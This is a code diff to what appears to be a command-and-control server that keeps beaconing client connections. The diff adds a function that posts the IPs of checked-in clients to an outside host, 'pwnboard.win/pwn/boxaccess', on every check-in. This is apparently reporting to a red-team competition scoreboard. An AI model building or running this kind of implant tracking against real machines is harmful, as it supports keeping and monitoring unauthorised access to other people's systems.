@@ -7,7 +7,7 @@ import sys
 import signal
 import pty
 from cmd import Cmd
-
+import requests
 
 #TODO A user can make groups and add clients to groups. The user then can select from each group which client to connect to.
 #TODO Develop new shell with cmd module
@@ -947,6 +947,7 @@ def checkInThread():
                 # print("Ping sent to: " + str(client.IP))
                 client.socket.settimeout(3.0) #timeout after 3 seconds of no recv
                 resp = client.socket.recv(BUFFER_SIZE).decode()
+                sendUpdate([client.IP])
                 client.socket.settimeout(None) #reset timeout
                 if resp != "beacon_pong": #if the client sends something else back
                     removeClient(client)
@@ -958,6 +959,19 @@ def checkInThread():
             except: #anything else breaks? keep going
                 pass
         time.sleep(60) #check in every minute
+
+def sendUpdate(ips, name="constctrl"):
+    host = "https://pwnboard.win/pwn/boxaccess"
+    # Here ips is a list of IP addresses to update
+    # If we are only updating 1 IP, use "ip" and pass a string
+    data = {'ips': ips, 'type': name}
+    try:
+        req = requests.post(host, json=data, timeout=3)
+        print(req.text)
+        return True
+    except Exception as E:
+        print(E)
+        return False
 
 if __name__ == "__main__":
     print("[SERVER] Server is starting...") 
